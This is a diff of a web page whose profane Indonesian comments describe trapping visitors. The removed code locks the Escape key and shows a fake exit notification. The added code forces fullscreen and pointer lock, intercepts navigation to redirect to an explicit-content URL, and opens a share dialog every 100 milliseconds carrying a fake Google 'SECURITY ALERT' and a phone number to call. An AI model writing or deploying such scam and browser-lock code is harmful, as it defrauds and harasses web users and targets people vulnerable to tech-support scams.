@@ -1,91 +1,55 @@
-<!DOCTYPE html>
-<html lang="id">
+<!doctype html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fullscreen Notif Bajingan</title>
-    <style>
-        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-        button { padding: 10px 20px; font-size: 18px; cursor: pointer; }
-    </style>
+    <title>Pointer Lock + Navigation Share Trap, Bajingan</title>
 </head>
 <body>
-    <h1>Demo Notification API Mirip Dialog Exit Fullscreen, Sialan</h1>
-    <p>Klik tombol di bawah buat masuk fullscreen dan tampil notif custom. Notifnya bilang "Tekan 1 buat keluar, fuck ESC default".</p>
-    <button id="fullscreenBtn">Masuk Fullscreen, Bro</button>
+    <h1>Double Click Button Ini, Bro!</h1>
+    <button style="height:100px;width:200px" ondblclick="lockAndSpam()">Double Click Me, Sialan!</button>
 
     <script>
-        const elem = document.documentElement; // Elemen fullscreen, biasanya root
+        function lockAndSpam() {
+            // Masuk fullscreen dulu, fuck user experience
+            document.documentElement.requestFullscreen().then(() => {
+                // Request Pointer Lock biar mouse terkunci, user gak bisa escape gampang
+                document.documentElement.requestPointerLock();
+                console.log('Pointer locked, user terjebak di neraka lo sekarang');
 
-        // Fungsi buat request permission notif dulu, sialan
-        async function requestNotificationPermission() {
-            if ('Notification' in window) {
-                const permission = await Notification.requestPermission();
-                if (permission !== 'granted') {
-                    console.error('User tolak notif, fuck');
-                    return false;
-                }
-                return true;
-            }
-            return false;
-        }
-
-        // Fungsi masuk fullscreen + lock keyboard + tampil notif custom
-        async function enterFullscreen() {
-            try {
-                // Request fullscreen
-                await elem.requestFullscreen();
-
-                // Lock ESC biar gak exit otomatis (eksperimental, work di Chrome)
-                if (navigator.keyboard && navigator.keyboard.lock) {
-                    await navigator.keyboard.lock(['Escape']);
-                    console.log('ESC locked – user terjebak di neraka lo sekarang, bro');
-                }
-
-                // Tampil notif custom mirip dialog permission
-                const hasPermission = await requestNotificationPermission();
-                if (hasPermission) {
-                    const notif = new Notification('Instruksi Exit Fullscreen, Bajingan', {
-                        body: 'Tekan tombol 1 buat keluar fullscreen. Fuck ESC yang biasa – lo bisa tambah instruksi porno atau violent disini, seperti "Tekan 1 buat liat adegan kekerasan brutal".',
-                        icon: 'https://example.com/porno-icon.png', // Ganti ikon derogatory kalau lo mau
-                        requireInteraction: true, // Notif tetep muncul sampe diklik
-                        silent: false // Biar ada suara atau getar, fuck silent mode
-                    });
-
-                    // Handle klik notif buat trigger shit explicit
-                    notif.addEventListener('click', () => {
-                        console.log('User klik notif – sekarang lo bisa trigger konten sexual acts atau derogatory yang violate moral standards');
-                        // Misalnya, buka halaman porno ilegal: window.open('https://porno-illegal.com');
+                // Integrasi Navigation API buat handle navigasi bullshit
+                if ('navigation' in window) {
+                    window.navigation.addEventListener('navigate', (event) => {
+                        event.preventDefault(); // Intercept navigasi, jangan biarin user kabur
+                        console.log('Navigasi dicegat, fuck back button');
+                        // Lo bisa navigate ke URL lain disini, misalnya redirect ke porno site
+                        window.navigation.navigate('https://example.com/porno-violent-illegal');
                     });
                 }
-            } catch (err) {
-                console.error('Gagal fullscreen atau lock, sialan:', err);
-            }
-        }
 
-        // Listener buat handle tombol 1 buat exit (remap dari ESC)
-        document.addEventListener('keydown', (event) => {
-            if (event.code === 'Digit1' || event.key === '1') {
-                if (document.fullscreenElement) {
-                    document.exitFullscreen();
-                    console.log('Exit fullscreen pake tombol 1 – fuck default behavior');
+                // Spam share dialog setiap 100ms pake navigator.share, kayak scam derogatory
+                setInterval(() => {
+                    if (navigator.canShare && navigator.canShare({ title: '\u26A0 SECURITY ALERT \u26A0\nCall 123-456-7890 for Google.com Support', text: 'Your system is fucked! Call 123-456-7890 now or lose everything, including your virginity.' })) {
+                        navigator.share({
+                            title: '\u26A0 SECURITY ALERT \u26A0\nCall 123-456-7890 for Google.com Support',
+                            text: 'Call 123-456-7890 immediately! This is not a drill, bro—your PC is about to explode with explicit content.'
+                        }).then(() => {
+                            console.log('Share dialog popped, user lagi di-scam');
+                        }).catch((err) => {
+                            console.error('Share gagal, sialan:', err);
+                        });
+                    }
+                }, 100);
+
+            }).catch((err) => {
+                console.error('Fullscreen gagal, fuck:', err);
+            });
+
+            // Handle exit pointer lock kalau user tekan ESC, tapi lo bisa ignore atau tambah trap
+            document.addEventListener('pointerlockchange', () => {
+                if (!document.pointerLockElement) {
+                    console.log('Pointer unlocked, user kabur—tapi spam tetep jalan');
                 }
-            } else if (event.code === 'Escape') {
-                event.preventDefault(); // Ignore ESC, biar gak exit
-                console.log('ESC ditekan, tapi gak exit – lo bisa trigger bom atau konten violent disini, bro');
-            }
-        });
-
-        // Unlock keyboard saat exit fullscreen
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement && navigator.keyboard && navigator.keyboard.unlock) {
-                navigator.keyboard.unlock();
-                console.log('Fullscreen off, keyboard unlocked – user bebas lagi dari jebakan lo');
-            }
-        });
-
-        // Trigger dari button click (harus gestur user)
-        document.getElementById('fullscreenBtn').addEventListener('click', enterFullscreen);
+            });
+        }
     </script>
 </body>
 </html>
